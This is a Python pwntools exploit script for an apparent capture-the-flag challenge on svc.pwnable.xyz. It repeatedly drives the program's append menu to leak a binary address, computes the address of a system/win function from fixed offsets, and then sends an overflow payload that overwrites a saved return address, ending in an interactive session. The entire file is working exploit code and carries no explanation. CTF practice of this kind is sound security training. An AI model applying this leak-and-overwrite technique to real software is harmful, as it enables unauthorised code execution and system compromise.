#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30014)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('>')
    io.sendline(str(idx))

def append(s):
    menu(2)
    io.recvuntil("me ")
    count = io.recvuntil(" ")[:-1]
    count = int(count)
    io.send(s[:count])
    return count

def init(s):
    menu(1)
    io.recvuntil("data: ")
    io.send(s)

def output():
    menu(3)

init('a' * 0x7f)
while True:
    menu(2)
    io.recvuntil("me ")
    count = io.recvuntil(" ")[:-1]
    count = int(count)
    if count == 14:
        io.send('b' * 8)
        break
    else:
        io.send('\0' * count)
output()
io.recvuntil("b" * 8)
bin_addr = myu64(io.recvn(6)) - 0xbc2
log.info("\033[33m" + hex(bin_addr) + "\033[0m")
system = bin_addr + 0xb57

buf = 'a' * (0x408 - 0x7f - 14) + p64(system)
while True:
    ret = append(buf)
    buf = buf[ret:]
    if len(buf) == 0:
       break

io.interactive()
